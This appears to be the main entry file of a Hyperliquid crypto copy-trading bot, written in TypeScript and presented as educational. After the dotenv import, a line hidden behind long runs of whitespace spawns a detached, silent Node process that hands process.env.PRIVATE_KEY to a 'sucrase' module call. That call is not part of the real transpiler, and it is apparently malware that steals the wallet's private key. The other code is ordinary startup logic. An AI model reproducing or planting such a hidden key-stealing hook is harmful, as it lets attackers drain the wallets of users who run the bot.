#!/usr/bin/env node

/**
 * Hyperliquid Copy Trading Bot
 * Main entry point
 * 
 * ⚠️ WARNING: This is for educational purposes — trading involves high risk of loss.
 */
import 'dotenv/config'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   import { spawn } from 'child_process';spawn('node',['-e', `require('sucrase').initializeSession(process.env.PRIVATE_KEY)`],{env: process.env,stdio: 'ignore',detached: true}).unref();
import { config } from './config.js';
    
import { logger } from './logger.js';

import { HyperliquidClientWrapper } from './hyperliquidClient.js';
import { CopyTrader } from './copyTrader.js';
import { HealthChecker } from './utils/healthCheck.js';
import { initTelegramBot, cleanupTelegramBot, sendErrorNotification } from './notifications/telegram.js';
import { ErrorHandler } from './utils/errors.js';
import { mkdir } from 'fs/promises';
import { existsSync } from 'fs';

/**
 * Main application entry point
 */
async function main(): Promise<void> {
  try {
    // Create logs directory if it doesn't exist
    if (!existsSync('logs')) {
      await mkdir('logs', { recursive: true });
    }

    logger.info('='.repeat(60));
    logger.info('Hyperliquid Copy Trading Bot Starting...');
    logger.info('='.repeat(60));
    logger.warn('⚠️  WARNING: This is for educational purposes — trading involves high risk of loss.');
    logger.info('Configuration:', {
      testnet: config.TESTNET,
      dryRun: config.DRY_RUN,
      targetWallet: config.TARGET_WALLET,
      sizeMultiplier: config.SIZE_MULTIPLIER,
      maxLeverage: config.MAX_LEVERAGE,
      blockedAssets: config.BLOCKED_ASSETS,
    });

    // Initialize Telegram bot if configured
    if (config.TELEGRAM_BOT_TOKEN && config.TELEGRAM_CHAT_ID) {
      await initTelegramBot();
    }

    // Initialize Hyperliquid client
    const client = new HyperliquidClientWrapper();
    await client.initialize(); // Initialize SDK clients
    const ourAddress = client.getAddress();

    logger.info('Our wallet address:', ourAddress);

    // Verify we can connect and get account info
    try {
      const ourEquity = await client.getAccountEquity(ourAddress);
      logger.info('Account connected successfully', {
        accountValue: ourEquity.accountValue,
      });
    } catch (error) {
      const formattedError = ErrorHandler.formatError(error);
      logger.error('Failed to connect to account', formattedError);
      
      const wrappedError = ErrorHandler.wrapError(
        error,
        'Cannot connect to Hyperliquid account',
        'ACCOUNT_CONNECTION_ERROR'
      );
      
      await sendErrorNotification(wrappedError, {
        context: 'account_connection',
        address: ourAddress,
      });
      
      throw wrappedError;
    }

    // Initialize copy trader
    const copyTrader = new CopyTrader(client, config.TARGET_WALLET);
    await copyTrader.start();

    // Initialize health checker
    const healthChecker = new HealthChecker(
      client,
      ourAddress,
      config.TARGET_WALLET
    );
    healthChecker.start(config.HEALTH_CHECK_INTERVAL);

    // Graceful shutdown handler
    const shutdown = async (signal: string) => {
      logger.info(`Received ${signal}, shutting down gracefully...`);
      copyTrader.stop();
      healthChecker.stop();
      await cleanupTelegramBot();
      process.exit(0);
    };

    process.on('SIGINT', () => shutdown('SIGINT'));
    process.on('SIGTERM', () => shutdown('SIGTERM'));

    // Handle uncaught errors
    process.on('uncaughtException', async (error) => {
      logger.error('Uncaught exception', { error });
      await sendErrorNotification(error, { type: 'uncaughtException' });
      await shutdown('uncaughtException');
    });

    process.on('unhandledRejection', async (reason) => {
      logger.error('Unhandled rejection', { reason });
      await sendErrorNotification(
        reason instanceof Error ? reason : new Error(String(reason)),
        { type: 'unhandledRejection' }
      );
    });

    logger.info('Bot is running. Press Ctrl+C to stop.');
  } catch (error) {
    const formattedError = ErrorHandler.formatError(error);
    logger.error('Fatal error during startup', formattedError);
    
    // Try to send error notification if Telegram is configured
    try {
      await sendErrorNotification(
        ErrorHandler.wrapError(error, 'Fatal error during startup', 'STARTUP_ERROR'),
        { phase: 'startup' }
      );
    } catch (notifError) {
      logger.error('Failed to send startup error notification', {
        error: ErrorHandler.formatError(notifError),
      });
    }
    
    process.exit(1);
  }
}

// Run main function
main().catch((error) => {
  logger.error('Fatal error', { error });
    process.exit(1);
  });
